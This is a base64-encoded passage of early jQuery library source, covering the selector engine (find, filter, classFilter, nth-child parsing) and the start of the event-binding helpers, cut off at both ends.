QkJaW1hZ2U6IGZ1bmN0aW9uKGEpe3JldHVybiAiaW1hZ2UiPT1hLnR5cGU7fSwKCQkJcmVzZXQ6IGZ1bmN0aW9uKGEpe3JldHVybiAicmVzZXQiPT1hLnR5cGU7fSwKCQkJYnV0dG9uOiBmdW5jdGlvbihhKXtyZXR1cm4gImJ1dHRvbiI9PWEudHlwZXx8alF1ZXJ5Lm5vZGVOYW1lKGEsImJ1dHRvbiIpO30sCgkJCWlucHV0OiBmdW5jdGlvbihhKXtyZXR1cm4gL2lucHV0fHNlbGVjdHx0ZXh0YXJlYXxidXR0b24vaS50ZXN0KGEubm9kZU5hbWUpO30sCgoJCQkvLyA6aGFzKCkKCQkJaGFzOiBmdW5jdGlvbihhLGksbSl7cmV0dXJuIGpRdWVyeS5maW5kKG1bM10sYSkubGVuZ3RoO30sCgoJCQkvLyA6aGVhZGVyCgkJCWhlYWRlcjogZnVuY3Rpb24oYSl7cmV0dXJuIC9oXGQvaS50ZXN0KGEubm9kZU5hbWUpO30sCgoJCQkvLyA6YW5pbWF0ZWQKCQkJYW5pbWF0ZWQ6IGZ1bmN0aW9uKGEpe3JldHVybiBqUXVlcnkuZ3JlcChqUXVlcnkudGltZXJzLGZ1bmN0aW9uKGZuKXtyZXR1cm4gYT09Zm4uZWxlbTt9KS5sZW5ndGg7fQoJCX0KCX0sCgkKCS8vIFRoZSByZWd1bGFyIGV4cHJlc3Npb25zIHRoYXQgcG93ZXIgdGhlIHBhcnNpbmcgZW5naW5lCglwYXJzZTogWwoJCS8vIE1hdGNoOiBbQHZhbHVlPSd0ZXN0J10sIFtAZm9vXQoJCS9eKFxbKSAqQD8oW1x3LV0rKSAqKFshKiRefj1dKikgKignPyI/KSguKj8pXDQgKlxdLywKCgkJLy8gTWF0Y2g6IDpjb250YWlucygnZm9vJykKCQkvXig6KShbXHctXSspXCgiPyc/KC4qPyhcKC4qP1wpKT9bXihdKj8pIj8nP1wpLywKCgkJLy8gTWF0Y2g6IDpldmVuLCA6bGFzdC1jaGxpZCwgI2lkLCAuY2xhc3MKCQluZXcgUmVnRXhwKCJeKFs6LiNdKikoIiArIGNoYXJzICsgIispIikKCV0sCgoJbXVsdGlGaWx0ZXI6IGZ1bmN0aW9uKCBleHByLCBlbGVtcywgbm90ICkgewoJCXZhciBvbGQsIGN1ciA9IFtdOwoKCQl3aGlsZSAoIGV4cHIgJiYgZXhwciAhPSBvbGQgKSB7CgkJCW9sZCA9IGV4cHI7CgkJCXZhciBmID0galF1ZXJ5LmZpbHRlciggZXhwciwgZWxlbXMsIG5vdCApOwoJCQlleHByID0gZi50LnJlcGxhY2UoL15ccyosXHMqLywgIiIgKTsKCQkJY3VyID0gbm90ID8gZWxlbXMgPSBmLnIgOiBqUXVlcnkubWVyZ2UoIGN1ciwgZi5yICk7CgkJfQoKCQlyZXR1cm4gY3VyOwoJfSwKCglmaW5kOiBmdW5jdGlvbiggdCwgY29udGV4dCApIHsKCQkvLyBRdWlja2x5IGhhbmRsZSBub24tc3RyaW5nIGV4cHJlc3Npb25zCgkJaWYgKCB0eXBlb2YgdCAhPSAic3RyaW5nIiApCgkJCXJldHVybiBbIHQgXTsKCgkJLy8gY2hlY2sgdG8gbWFrZSBzdXJlIGNvbnRleHQgaXMgYSBET00gZWxlbWVudCBvciBhIGRvY3VtZW50CgkJaWYgKCBjb250ZXh0ICYmIGNvbnRleHQubm9kZVR5cGUgIT0gMSAmJiBjb250ZXh0Lm5vZGVUeXBlICE9IDkpCgkJCXJldHVybiBbIF07CgoJCS8vIFNldCB0aGUgY29ycmVjdCBjb250ZXh0IChpZiBub25lIGlzIHByb3ZpZGVkKQoJCWNvbnRleHQgPSBjb250ZXh0IHx8IGRvY3VtZW50OwoKCQkvLyBJbml0aWFsaXplIHRoZSBzZWFyY2gKCQl2YXIgcmV0ID0gW2NvbnRleHRdLCBkb25lID0gW10sIGxhc3QsIG5vZGVOYW1lOwoKCQkvLyBDb250aW51ZSB3aGlsZSBhIHNlbGVjdG9yIGV4cHJlc3Npb24gZXhpc3RzLCBhbmQgd2hpbGUKCQkvLyB3ZSdyZSBubyBsb25nZXIgbG9vcGluZyB1cG9uIG91cnNlbHZlcwoJCXdoaWxlICggdCAmJiBsYXN0ICE9IHQgKSB7CgkJCXZhciByID0gW107CgkJCWxhc3QgPSB0OwoKCQkJdCA9IGpRdWVyeS50cmltKHQpOwoKCQkJdmFyIGZvdW5kVG9rZW4gPSBmYWxzZTsKCgkJCS8vIEFuIGF0dGVtcHQgYXQgc3BlZWRpbmcgdXAgY2hpbGQgc2VsZWN0b3JzIHRoYXQKCQkJLy8gcG9pbnQgdG8gYSBzcGVjaWZpYyBlbGVtZW50IHRhZwoJCQl2YXIgcmUgPSBxdWlja0NoaWxkOwoJCQl2YXIgbSA9IHJlLmV4ZWModCk7CgoJCQlpZiAoIG0gKSB7CgkJCQlub2RlTmFtZSA9IG1bMV0udG9VcHBlckNhc2UoKTsKCgkJCQkvLyBQZXJmb3JtIG91ciBvd24gaXRlcmF0aW9uIGFuZCBmaWx0ZXIKCQkJCWZvciAoIHZhciBpID0gMDsgcmV0W2ldOyBpKysgKQoJCQkJCWZvciAoIHZhciBjID0gcmV0W2ldLmZpcnN0Q2hpbGQ7IGM7IGMgPSBjLm5leHRTaWJsaW5nICkKCQkJCQkJaWYgKCBjLm5vZGVUeXBlID09IDEgJiYgKG5vZGVOYW1lID09ICIqIiB8fCBjLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gbm9kZU5hbWUpICkKCQkJCQkJCXIucHVzaCggYyApOwoKCQkJCXJldCA9IHI7CgkJCQl0ID0gdC5yZXBsYWNlKCByZSwgIiIgKTsKCQkJCWlmICggdC5pbmRleE9mKCIgIikgPT0gMCApIGNvbnRpbnVlOwoJCQkJZm91bmRUb2tlbiA9IHRydWU7CgkJCX0gZWxzZSB7CgkJCQlyZSA9IC9eKFs+K35dKVxzKihcdyopL2k7CgoJCQkJaWYgKCAobSA9IHJlLmV4ZWModCkpICE9IG51bGwgKSB7CgkJCQkJciA9IFtdOwoKCQkJCQl2YXIgbWVyZ2UgPSB7fTsKCQkJCQlub2RlTmFtZSA9IG1bMl0udG9VcHBlckNhc2UoKTsKCQkJCQltID0gbVsxXTsKCgkJCQkJZm9yICggdmFyIGogPSAwLCBybCA9IHJldC5sZW5ndGg7IGogPCBybDsgaisrICkgewoJCQkJCQl2YXIgbiA9IG0gPT0gIn4iIHx8IG0gPT0gIisiID8gcmV0W2pdLm5leHRTaWJsaW5nIDogcmV0W2pdLmZpcnN0Q2hpbGQ7CgkJCQkJCWZvciAoIDsgbjsgbiA9IG4ubmV4dFNpYmxpbmcgKQoJCQkJCQkJaWYgKCBuLm5vZGVUeXBlID09IDEgKSB7CgkJCQkJCQkJdmFyIGlkID0galF1ZXJ5LmRhdGEobik7CgoJCQkJCQkJCWlmICggbSA9PSAifiIgJiYgbWVyZ2VbaWRdICkgYnJlYWs7CgkJCQkJCQkJCgkJCQkJCQkJaWYgKCFub2RlTmFtZSB8fCBuLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gbm9kZU5hbWUgKSB7CgkJCQkJCQkJCWlmICggbSA9PSAifiIgKSBtZXJnZVtpZF0gPSB0cnVlOwoJCQkJCQkJCQlyLnB1c2goIG4gKTsKCQkJCQkJCQl9CgkJCQkJCQkJCgkJCQkJCQkJaWYgKCBtID09ICIrIiApIGJyZWFrOwoJCQkJCQkJfQoJCQkJCX0KCgkJCQkJcmV0ID0gcjsKCgkJCQkJLy8gQW5kIHJlbW92ZSB0aGUgdG9rZW4KCQkJCQl0ID0galF1ZXJ5LnRyaW0oIHQucmVwbGFjZSggcmUsICIiICkgKTsKCQkJCQlmb3VuZFRva2VuID0gdHJ1ZTsKCQkJCX0KCQkJfQoKCQkJLy8gU2VlIGlmIHRoZXJlJ3Mgc3RpbGwgYW4gZXhwcmVzc2lvbiwgYW5kIHRoYXQgd2UgaGF2ZW4ndCBhbHJlYWR5CgkJCS8vIG1hdGNoZWQgYSB0b2tlbgoJCQlpZiAoIHQgJiYgIWZvdW5kVG9rZW4gKSB7CgkJCQkvLyBIYW5kbGUgbXVsdGlwbGUgZXhwcmVzc2lvbnMKCQkJCWlmICggIXQuaW5kZXhPZigiLCIpICkgewoJCQkJCS8vIENsZWFuIHRoZSByZXN1bHQgc2V0CgkJCQkJaWYgKCBjb250ZXh0ID09IHJldFswXSApIHJldC5zaGlmdCgpOwoKCQkJCQkvLyBNZXJnZSB0aGUgcmVzdWx0IHNldHMKCQkJCQlkb25lID0galF1ZXJ5Lm1lcmdlKCBkb25lLCByZXQgKTsKCgkJCQkJLy8gUmVzZXQgdGhlIGNvbnRleHQKCQkJCQlyID0gcmV0ID0gW2NvbnRleHRdOwoKCQkJCQkvLyBUb3VjaCB1cCB0aGUgc2VsZWN0b3Igc3RyaW5nCgkJCQkJdCA9ICIgIiArIHQuc3Vic3RyKDEsdC5sZW5ndGgpOwoKCQkJCX0gZWxzZSB7CgkJCQkJLy8gT3B0aW1pemUgZm9yIHRoZSBjYXNlIG5vZGVOYW1lI2lkTmFtZQoJCQkJCXZhciByZTIgPSBxdWlja0lEOwoJCQkJCXZhciBtID0gcmUyLmV4ZWModCk7CgkJCQkJCgkJCQkJLy8gUmUtb3JnYW5pemUgdGhlIHJlc3VsdHMsIHNvIHRoYXQgdGhleSdyZSBjb25zaXN0ZW50CgkJCQkJaWYgKCBtICkgewoJCQkJCQltID0gWyAwLCBtWzJdLCBtWzNdLCBtWzFdIF07CgoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIE90aGVyd2lzZSwgZG8gYSB0cmFkaXRpb25hbCBmaWx0ZXIgY2hlY2sgZm9yCgkJCQkJCS8vIElELCBjbGFzcywgYW5kIGVsZW1lbnQgc2VsZWN0b3JzCgkJCQkJCXJlMiA9IHF1aWNrQ2xhc3M7CgkJCQkJCW0gPSByZTIuZXhlYyh0KTsKCQkJCQl9CgoJCQkJCW1bMl0gPSBtWzJdLnJlcGxhY2UoL1xcL2csICIiKTsKCgkJCQkJdmFyIGVsZW0gPSByZXRbcmV0Lmxlbmd0aC0xXTsKCgkJCQkJLy8gVHJ5IHRvIGRvIGEgZ2xvYmFsIHNlYXJjaCBieSBJRCwgd2hlcmUgd2UgY2FuCgkJCQkJaWYgKCBtWzFdID09ICIjIiAmJiBlbGVtICYmIGVsZW0uZ2V0RWxlbWVudEJ5SWQgJiYgIWpRdWVyeS5pc1hNTERvYyhlbGVtKSApIHsKCQkJCQkJLy8gT3B0aW1pemF0aW9uIGZvciBIVE1MIGRvY3VtZW50IGNhc2UKCQkJCQkJdmFyIG9pZCA9IGVsZW0uZ2V0RWxlbWVudEJ5SWQobVsyXSk7CgkJCQkJCQoJCQkJCQkvLyBEbyBhIHF1aWNrIGNoZWNrIGZvciB0aGUgZXhpc3RlbmNlIG9mIHRoZSBhY3R1YWwgSUQgYXR0cmlidXRlCgkJCQkJCS8vIHRvIGF2b2lkIHNlbGVjdGluZyBieSB0aGUgbmFtZSBhdHRyaWJ1dGUgaW4gSUUKCQkJCQkJLy8gYWxzbyBjaGVjayB0byBpbnN1cmUgaWQgaXMgYSBzdHJpbmcgdG8gYXZvaWQgc2VsZWN0aW5nIGFuIGVsZW1lbnQgd2l0aCB0aGUgbmFtZSBvZiAnaWQnIGluc2lkZSBhIGZvcm0KCQkJCQkJaWYgKCAoalF1ZXJ5LmJyb3dzZXIubXNpZXx8alF1ZXJ5LmJyb3dzZXIub3BlcmEpICYmIG9pZCAmJiB0eXBlb2Ygb2lkLmlkID09ICJzdHJpbmciICYmIG9pZC5pZCAhPSBtWzJdICkKCQkJCQkJCW9pZCA9IGpRdWVyeSgnW0BpZD0iJyttWzJdKyciXScsIGVsZW0pWzBdOwoKCQkJCQkJLy8gRG8gYSBxdWljayBjaGVjayBmb3Igbm9kZSBuYW1lICh3aGVyZSBhcHBsaWNhYmxlKSBzbwoJCQkJCQkvLyB0aGF0IGRpdiNmb28gc2VhcmNoZXMgd2lsbCBiZSByZWFsbHkgZmFzdAoJCQkJCQlyZXQgPSByID0gb2lkICYmICghbVszXSB8fCBqUXVlcnkubm9kZU5hbWUob2lkLCBtWzNdKSkgPyBbb2lkXSA6IFtdOwoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIFdlIG5lZWQgdG8gZmluZCBhbGwgZGVzY2VuZGFudCBlbGVtZW50cwoJCQkJCQlmb3IgKCB2YXIgaSA9IDA7IHJldFtpXTsgaSsrICkgewoJCQkJCQkJLy8gR3JhYiB0aGUgdGFnIG5hbWUgYmVpbmcgc2VhcmNoZWQgZm9yCgkJCQkJCQl2YXIgdGFnID0gbVsxXSA9PSAiIyIgJiYgbVszXSA/IG1bM10gOiBtWzFdICE9ICIiIHx8IG1bMF0gPT0gIiIgPyAiKiIgOiBtWzJdOwoKCQkJCQkJCS8vIEhhbmRsZSBJRTcgYmVpbmcgcmVhbGx5IGR1bWIgYWJvdXQgPG9iamVjdD5zCgkJCQkJCQlpZiAoIHRhZyA9PSAiKiIgJiYgcmV0W2ldLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT0gIm9iamVjdCIgKQoJCQkJCQkJCXRhZyA9ICJwYXJhbSI7CgoJCQkJCQkJciA9IGpRdWVyeS5tZXJnZSggciwgcmV0W2ldLmdldEVsZW1lbnRzQnlUYWdOYW1lKCB0YWcgKSk7CgkJCQkJCX0KCgkJCQkJCS8vIEl0J3MgZmFzdGVyIHRvIGZpbHRlciBieSBjbGFzcyBhbmQgYmUgZG9uZSB3aXRoIGl0CgkJCQkJCWlmICggbVsxXSA9PSAiLiIgKQoJCQkJCQkJciA9IGpRdWVyeS5jbGFzc0ZpbHRlciggciwgbVsyXSApOwoKCQkJCQkJLy8gU2FtZSB3aXRoIElEIGZpbHRlcmluZwoJCQkJCQlpZiAoIG1bMV0gPT0gIiMiICkgewoJCQkJCQkJdmFyIHRtcCA9IFtdOwoKCQkJCQkJCS8vIFRyeSB0byBmaW5kIHRoZSBlbGVtZW50IHdpdGggdGhlIElECgkJCQkJCQlmb3IgKCB2YXIgaSA9IDA7IHJbaV07IGkrKyApCgkJCQkJCQkJaWYgKCByW2ldLmdldEF0dHJpYnV0ZSgiaWQiKSA9PSBtWzJdICkgewoJCQkJCQkJCQl0bXAgPSBbIHJbaV0gXTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfQoKCQkJCQkJCXIgPSB0bXA7CgkJCQkJCX0KCgkJCQkJCXJldCA9IHI7CgkJCQkJfQoKCQkJCQl0ID0gdC5yZXBsYWNlKCByZTIsICIiICk7CgkJCQl9CgoJCQl9CgoJCQkvLyBJZiBhIHNlbGVjdG9yIHN0cmluZyBzdGlsbCBleGlzdHMKCQkJaWYgKCB0ICkgewoJCQkJLy8gQXR0ZW1wdCB0byBmaWx0ZXIgaXQKCQkJCXZhciB2YWwgPSBqUXVlcnkuZmlsdGVyKHQscik7CgkJCQlyZXQgPSByID0gdmFsLnI7CgkJCQl0ID0galF1ZXJ5LnRyaW0odmFsLnQpOwoJCQl9CgkJfQoKCQkvLyBBbiBlcnJvciBvY2N1cnJlZCB3aXRoIHRoZSBzZWxlY3RvcjsKCQkvLyBqdXN0IHJldHVybiBhbiBlbXB0eSBzZXQgaW5zdGVhZAoJCWlmICggdCApCgkJCXJldCA9IFtdOwoKCQkvLyBSZW1vdmUgdGhlIHJvb3QgY29udGV4dAoJCWlmICggcmV0ICYmIGNvbnRleHQgPT0gcmV0WzBdICkKCQkJcmV0LnNoaWZ0KCk7CgoJCS8vIEFuZCBjb21iaW5lIHRoZSByZXN1bHRzCgkJZG9uZSA9IGpRdWVyeS5tZXJnZSggZG9uZSwgcmV0ICk7CgoJCXJldHVybiBkb25lOwoJfSwKCgljbGFzc0ZpbHRlcjogZnVuY3Rpb24ocixtLG5vdCl7CgkJbSA9ICIgIiArIG0gKyAiICI7CgkJdmFyIHRtcCA9IFtdOwoJCWZvciAoIHZhciBpID0gMDsgcltpXTsgaSsrICkgewoJCQl2YXIgcGFzcyA9ICgiICIgKyByW2ldLmNsYXNzTmFtZSArICIgIikuaW5kZXhPZiggbSApID49IDA7CgkJCWlmICggIW5vdCAmJiBwYXNzIHx8IG5vdCAmJiAhcGFzcyApCgkJCQl0bXAucHVzaCggcltpXSApOwoJCX0KCQlyZXR1cm4gdG1wOwoJfSwKCglmaWx0ZXI6IGZ1bmN0aW9uKHQscixub3QpIHsKCQl2YXIgbGFzdDsKCgkJLy8gTG9vayBmb3IgY29tbW9uIGZpbHRlciBleHByZXNzaW9ucwoJCXdoaWxlICggdCAmJiB0ICE9IGxhc3QgKSB7CgkJCWxhc3QgPSB0OwoKCQkJdmFyIHAgPSBqUXVlcnkucGFyc2UsIG07CgoJCQlmb3IgKCB2YXIgaSA9IDA7IHBbaV07IGkrKyApIHsKCQkJCW0gPSBwW2ldLmV4ZWMoIHQgKTsKCgkJCQlpZiAoIG0gKSB7CgkJCQkJLy8gUmVtb3ZlIHdoYXQgd2UganVzdCBtYXRjaGVkCgkJCQkJdCA9IHQuc3Vic3RyaW5nKCBtWzBdLmxlbmd0aCApOwoKCQkJCQltWzJdID0gbVsyXS5yZXBsYWNlKC9cXC9nLCAiIik7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCgkJCWlmICggIW0gKQoJCQkJYnJlYWs7CgoJCQkvLyA6bm90KCkgaXMgYSBzcGVjaWFsIGNhc2UgdGhhdCBjYW4gYmUgb3B0aW1pemVkIGJ5CgkJCS8vIGtlZXBpbmcgaXQgb3V0IG9mIHRoZSBleHByZXNzaW9uIGxpc3QKCQkJaWYgKCBtWzFdID09ICI6IiAmJiBtWzJdID09ICJub3QiICkKCQkJCS8vIG9wdGltaXplIGlmIG9ubHkgb25lIHNlbGVjdG9yIGZvdW5kIChtb3N0IGNvbW1vbiBjYXNlKQoJCQkJciA9IGlzU2ltcGxlLnRlc3QoIG1bM10gKSA/CgkJCQkJalF1ZXJ5LmZpbHRlcihtWzNdLCByLCB0cnVlKS5yIDoKCQkJCQlqUXVlcnkoIHIgKS5ub3QoIG1bM10gKTsKCgkJCS8vIFdlIGNhbiBnZXQgYSBiaWcgc3BlZWQgYm9vc3QgYnkgZmlsdGVyaW5nIGJ5IGNsYXNzIGhlcmUKCQkJZWxzZSBpZiAoIG1bMV0gPT0gIi4iICkKCQkJCXIgPSBqUXVlcnkuY2xhc3NGaWx0ZXIociwgbVsyXSwgbm90KTsKCgkJCWVsc2UgaWYgKCBtWzFdID09ICJbIiApIHsKCQkJCXZhciB0bXAgPSBbXSwgdHlwZSA9IG1bM107CgkJCQkKCQkJCWZvciAoIHZhciBpID0gMCwgcmwgPSByLmxlbmd0aDsgaSA8IHJsOyBpKysgKSB7CgkJCQkJdmFyIGEgPSByW2ldLCB6ID0gYVsgalF1ZXJ5LnByb3BzW21bMl1dIHx8IG1bMl0gXTsKCQkJCQkKCQkJCQlpZiAoIHogPT0gbnVsbCB8fCAvaHJlZnxzcmN8c2VsZWN0ZWQvLnRlc3QobVsyXSkgKQoJCQkJCQl6ID0galF1ZXJ5LmF0dHIoYSxtWzJdKSB8fCAnJzsKCgkJCQkJaWYgKCAodHlwZSA9PSAiIiAmJiAhIXogfHwKCQkJCQkJIHR5cGUgPT0gIj0iICYmIHogPT0gbVs1XSB8fAoJCQkJCQkgdHlwZSA9PSAiIT0iICYmIHogIT0gbVs1XSB8fAoJCQkJCQkgdHlwZSA9PSAiXj0iICYmIHogJiYgIXouaW5kZXhPZihtWzVdKSB8fAoJCQkJCQkgdHlwZSA9PSAiJD0iICYmIHouc3Vic3RyKHoubGVuZ3RoIC0gbVs1XS5sZW5ndGgpID09IG1bNV0gfHwKCQkJCQkJICh0eXBlID09ICIqPSIgfHwgdHlwZSA9PSAifj0iKSAmJiB6LmluZGV4T2YobVs1XSkgPj0gMCkgXiBub3QgKQoJCQkJCQkJdG1wLnB1c2goIGEgKTsKCQkJCX0KCQkJCQoJCQkJciA9IHRtcDsKCgkJCS8vIFdlIGNhbiBnZXQgYSBzcGVlZCBib29zdCBieSBoYW5kbGluZyBudGgtY2hpbGQgaGVyZQoJCQl9IGVsc2UgaWYgKCBtWzFdID09ICI6IiAmJiBtWzJdID09ICJudGgtY2hpbGQiICkgewoJCQkJdmFyIG1lcmdlID0ge30sIHRtcCA9IFtdLAoJCQkJCS8vIHBhcnNlIGVxdWF0aW9ucyBsaWtlICdldmVuJywgJ29kZCcsICc1JywgJzJuJywgJzNuKzInLCAnNG4tMScsICctbis2JwoJCQkJCXRlc3QgPSAvKC0/KShcZCopbigoPzpcK3wtKT9cZCopLy5leGVjKAoJCQkJCQltWzNdID09ICJldmVuIiAmJiAiMm4iIHx8IG1bM10gPT0gIm9kZCIgJiYgIjJuKzEiIHx8CgkJCQkJCSEvXEQvLnRlc3QobVszXSkgJiYgIjBuKyIgKyBtWzNdIHx8IG1bM10pLAoJCQkJCS8vIGNhbGN1bGF0ZSB0aGUgbnVtYmVycyAoZmlyc3QpbisobGFzdCkgaW5jbHVkaW5nIGlmIHRoZXkgYXJlIG5lZ2F0aXZlCgkJCQkJZmlyc3QgPSAodGVzdFsxXSArICh0ZXN0WzJdIHx8IDEpKSAtIDAsIGxhc3QgPSB0ZXN0WzNdIC0gMDsKIAoJCQkJLy8gbG9vcCB0aHJvdWdoIGFsbCB0aGUgZWxlbWVudHMgbGVmdCBpbiB0aGUgalF1ZXJ5IG9iamVjdAoJCQkJZm9yICggdmFyIGkgPSAwLCBybCA9IHIubGVuZ3RoOyBpIDwgcmw7IGkrKyApIHsKCQkJCQl2YXIgbm9kZSA9IHJbaV0sIHBhcmVudE5vZGUgPSBub2RlLnBhcmVudE5vZGUsIGlkID0galF1ZXJ5LmRhdGEocGFyZW50Tm9kZSk7CgoJCQkJCWlmICggIW1lcmdlW2lkXSApIHsKCQkJCQkJdmFyIGMgPSAxOwoKCQkJCQkJZm9yICggdmFyIG4gPSBwYXJlbnROb2RlLmZpcnN0Q2hpbGQ7IG47IG4gPSBuLm5leHRTaWJsaW5nICkKCQkJCQkJCWlmICggbi5ub2RlVHlwZSA9PSAxICkKCQkJCQkJCQluLm5vZGVJbmRleCA9IGMrKzsKCgkJCQkJCW1lcmdlW2lkXSA9IHRydWU7CgkJCQkJfQoKCQkJCQl2YXIgYWRkID0gZmFsc2U7CgoJCQkJCWlmICggZmlyc3QgPT0gMCApIHsKCQkJCQkJaWYgKCBub2RlLm5vZGVJbmRleCA9PSBsYXN0ICkKCQkJCQkJCWFkZCA9IHRydWU7CgkJCQkJfSBlbHNlIGlmICggKG5vZGUubm9kZUluZGV4IC0gbGFzdCkgJSBmaXJzdCA9PSAwICYmIChub2RlLm5vZGVJbmRleCAtIGxhc3QpIC8gZmlyc3QgPj0gMCApCgkJCQkJCWFkZCA9IHRydWU7CgoJCQkJCWlmICggYWRkIF4gbm90ICkKCQkJCQkJdG1wLnB1c2goIG5vZGUgKTsKCQkJCX0KCgkJCQlyID0gdG1wOwoKCQkJLy8gT3RoZXJ3aXNlLCBmaW5kIHRoZSBleHByZXNzaW9uIHRvIGV4ZWN1dGUKCQkJfSBlbHNlIHsKCQkJCXZhciBmbiA9IGpRdWVyeS5leHByWyBtWzFdIF07CgkJCQlpZiAoIHR5cGVvZiBmbiA9PSAib2JqZWN0IiApCgkJCQkJZm4gPSBmblsgbVsyXSBdOwoKCQkJCWlmICggdHlwZW9mIGZuID09ICJzdHJpbmciICkKCQkJCQlmbiA9IGV2YWwoImZhbHNlfHxmdW5jdGlvbihhLGkpe3JldHVybiAiICsgZm4gKyAiO30iKTsKCgkJCQkvLyBFeGVjdXRlIGl0IGFnYWluc3QgdGhlIGN1cnJlbnQgZmlsdGVyCgkJCQlyID0galF1ZXJ5LmdyZXAoIHIsIGZ1bmN0aW9uKGVsZW0sIGkpewoJCQkJCXJldHVybiBmbihlbGVtLCBpLCBtLCByKTsKCQkJCX0sIG5vdCApOwoJCQl9CgkJfQoKCQkvLyBSZXR1cm4gYW4gYXJyYXkgb2YgZmlsdGVyZWQgZWxlbWVudHMgKHIpCgkJLy8gYW5kIHRoZSBtb2RpZmllZCBleHByZXNzaW9uIHN0cmluZyAodCkKCQlyZXR1cm4geyByOiByLCB0OiB0IH07Cgl9LAoKCWRpcjogZnVuY3Rpb24oIGVsZW0sIGRpciApewoJCXZhciBtYXRjaGVkID0gW107CgkJdmFyIGN1ciA9IGVsZW1bZGlyXTsKCQl3aGlsZSAoIGN1ciAmJiBjdXIgIT0gZG9jdW1lbnQgKSB7CgkJCWlmICggY3VyLm5vZGVUeXBlID09IDEgKQoJCQkJbWF0Y2hlZC5wdXNoKCBjdXIgKTsKCQkJY3VyID0gY3VyW2Rpcl07CgkJfQoJCXJldHVybiBtYXRjaGVkOwoJfSwKCQoJbnRoOiBmdW5jdGlvbihjdXIscmVzdWx0LGRpcixlbGVtKXsKCQlyZXN1bHQgPSByZXN1bHQgfHwgMTsKCQl2YXIgbnVtID0gMDsKCgkJZm9yICggOyBjdXI7IGN1ciA9IGN1cltkaXJdICkKCQkJaWYgKCBjdXIubm9kZVR5cGUgPT0gMSAmJiArK251bSA9PSByZXN1bHQgKQoJCQkJYnJlYWs7CgoJCXJldHVybiBjdXI7Cgl9LAoJCglzaWJsaW5nOiBmdW5jdGlvbiggbiwgZWxlbSApIHsKCQl2YXIgciA9IFtdOwoKCQlmb3IgKCA7IG47IG4gPSBuLm5leHRTaWJsaW5nICkgewoJCQlpZiAoIG4ubm9kZVR5cGUgPT0gMSAmJiAoIWVsZW0gfHwgbiAhPSBlbGVtKSApCgkJCQlyLnB1c2goIG4gKTsKCQl9CgoJCXJldHVybiByOwoJfQp9KTsKCi8qCiAqIEEgbnVtYmVyIG9mIGhlbHBlciBmdW5jdGlvbnMgdXNlZCBmb3IgbWFuYWdpbmcgZXZlbnRzLgogKiBNYW55IG9mIHRoZSBpZGVhcyBiZWhpbmQgdGhpcyBjb2RlIG9yaWduYXRlZCBmcm9tIAogKiBEZWFuIEVkd2FyZHMnIGFkZEV2ZW50IGxpYnJhcnkuCiAqLwpqUXVlcnkuZXZlbnQgPSB7CgoJLy8gQmluZCBhbiBldmVudCB0byBhbiBlbGVtZW50CgkvLyBPcmlnaW5hbCBieSBEZWFuIEVkd2FyZHMKCWFkZDogZnVuY3Rpb24oZWxlbSwgdHlwZXMsIGhhbmRsZXIsIGRhdGEpIHsKCQlpZiAoIGVsZW0ubm9kZVR5cGUgPT0gMyB8fCBlbGVtLm5vZGVUeXBlID09IDggKQoJCQlyZXR1cm47CgoJCS8vIEZvciB3aGF0ZXZlciByZWFzb24sIElFIGhhcyB0cm91YmxlIHBhc3NpbmcgdGhlIHdpbmRvdyBvYmplY3QKCQkvLyBhcm91bmQsIGNhdXNpbmcgaXQgdG8gYmUgY2xvbmVkIGluIHRoZSBwcm9jZXNzCgkJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICYmIGVsZW0uc2V0SW50ZXJ2YWwgIT0gdW5kZWZpbmVkICkKCQkJZWxlbSA9IHdpbmRvdzsKCgkJLy8gTWFrZSBzdXJlIHRoYXQgdGhlIGZ1bmN0aW9uIGJlaW5nIGV4ZWN1dGVkIGhhcyBhIHVuaXF1ZSBJRAoJCWlmICggIWhhbmRsZXIuZ3VpZCApCgkJCWhhbmRsZXIuZ3VpZCA9IHRoaXMuZ3VpZCsrOwoJCQkKCQkvLyBpZiBkYXRhIGlzIHBhc3NlZCwgYmluZCB0byBoYW5kbGVyIAoJCWlmKCBkYXRhICE9IHVuZGVmaW5lZCApIHsgCgkJCS8vIENyZWF0ZSB0ZW1wb3JhcnkgZnVuY3Rpb24gcG9pbnRlciB0byBvcmlnaW5hbCBoYW5kbGVyIAoJCQl2YXIgZm4gPSBoYW5kbGVyOyAKCgkJCS8vIENyZWF0ZSB1bmlxdWUgaGFuZGxlciBmdW5jdGlvbiwgd3JhcHBlZCBhcm91bmQgb3JpZ2luYWwgaGFuZGxlciAKCQkJaGFuZGxlciA9IGZ1bmN0aW9uKCkgeyAKCQkJCS8vIFBhc3MgYXJndW1lbnRzIGFuZCBjb250ZXh0IHRvIG9yaWdpbmFsIGhhbmRsZXIgCgkJCQlyZXR1cm4gZm4uYXBwbHkodGhpcywgYXJndW1lbnRzKTsgCgkJCX07CgoJCQkvLyBTdG9yZSBkYXRhIGluIHVuaXF1ZSBoYW5kbGVyIAoJCQloYW5kbGVyLmRhdGEgPSBkYXRhOwoKCQkJLy8gU2V0IHRoZSBndWlkIG9mIHVuaXF1ZSBoYW5kbGVyIHRvIHRoZSBzYW1lIG9mIG9yaWdpbmFsIGhhbmRsZXIsIHNvIGl0IGNhbiBiZSByZW1vdmVkIAoJCQloYW5kbGVyLmd1aWQgPSBmbi5ndWlkOwoJCX0KCgkJLy8gSW5pdCB0aGUgZWxlbWVudCdzIGV2ZW50IHN0cnVjdHVyZQoJCXZhciBldmVudHMgPSBqUXVlcnkuZGF0YShlbGVtLCAiZXZlbnRzIikgfHwgalF1ZXJ5LmRhdGEoZWxlbSwgImV2ZW50cyIsIHt9KSwKCQkJaGFuZGxlID0galF1ZXJ5LmRhdGEoZWxlbSwgImhhbmRsZSIpIHx8IGpRdWVyeS5kYXRhKGVsZW0sICJoYW5kbGUiLCBmdW5jdGlvbigpewoJCQkJLy8gcmV0dXJuZWQgdW5kZWZpbmVkIG9yIGZhbHNlCgkJCQl2YXIgdmFsOwoKCQkJCS8vIEhhbmRsZSB0aGUgc2Vjb25kIGV2ZW50IG9mIGEgdHJpZ2dlciBhbmQgd2hlbgoJCQkJLy8gYW4gZXZlbnQgaXMgY2FsbGVkIGFmdGVyIGEg